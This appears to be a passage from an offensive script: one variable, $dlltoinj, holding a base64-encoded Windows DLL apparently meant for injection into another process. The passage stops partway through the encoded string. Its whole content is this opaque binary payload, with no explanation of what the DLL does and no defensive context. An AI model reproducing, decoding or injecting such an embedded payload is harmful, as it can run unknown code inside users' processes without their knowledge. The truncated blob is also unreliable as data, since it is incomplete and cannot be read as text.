$dlltoinj = "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
